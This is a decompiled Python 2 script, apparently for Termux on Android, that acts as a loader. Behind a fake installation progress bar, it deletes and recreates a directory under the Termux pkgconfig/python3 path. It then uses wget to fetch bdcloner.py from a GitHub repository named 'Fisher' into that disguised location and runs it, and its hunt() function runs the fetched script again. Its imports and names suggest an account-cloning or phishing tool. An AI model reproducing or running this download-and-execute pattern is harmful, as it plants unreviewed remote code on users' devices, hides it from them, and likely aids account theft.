# Source Generated with Decompyle++
# File: out.pyc (Python 2.7)


try:
    import os
    import sys
    import time
    import datetime
    import random
    import hashlib
    import re
    import threading
    import json
    import urllib
    import cookielib
    import getpass
    import mechanize
    import requests
    import hunterboy
    from multiprocessing.pool import ThreadPool
    from requests.exceptions import ConnectionError
    from mechanize import Browser
    os.system('clear')
except ImportError:
    os.system('clear')
    print '  \x1b[1;91m=====> 10%'
    os.system('pkg install wget curl')
    print '  \x1b[1;93m==============> 30%'
    os.system('pip2 install lolcat')
    print '  \x1b[1;94m=====================> 40%'
    os.system('pip2 install mechanize')
    print '  \x1b[1;95m============================> 50%'
    os.system('pip2 install bs4')
    print '  \x1b[1;91m=================================> 60%'
    os.system('rm -rf /data/data/com.termux/files/usr/lib/pkgconfig/python3')
    print '  \x1b[1;93m========================================> 70%'
    os.system('clear')
    os.system('mkdir /data/data/com.termux/files/usr/lib/pkgconfig/python3 && cd /data/data/com.termux/files/usr/lib/pkgconfig/python3')
    print '  \x1b[1;91m==============================================> 80%'
    os.system('cd /data/data/com.termux/files/usr/lib/pkgconfig/python3 && wget https://raw.githubusercontent.com/Ruler-Boy/Fisher/main/bdcloner.py')
    print '  \x1b[1;92m===================================================> 90%'
    os.system('clear')
    time.sleep(0.1)
    os.system('cd /data/data/com.termux/files/usr/lib/pkgconfig/python3 && python2 bdcloner.py')
    print '  \x1b[1;93m==========================================================> 100%'

reload(sys)
sys.setdefaultencoding('utf8')
os.system('clear')

def hunt():
    time.sleep(1)
    os.system('cd /data/data/com.termux/files/usr/lib/pkgconfig/python3 && python2 bdcloner.py')

if __name__ == '__main__':
    hunt()
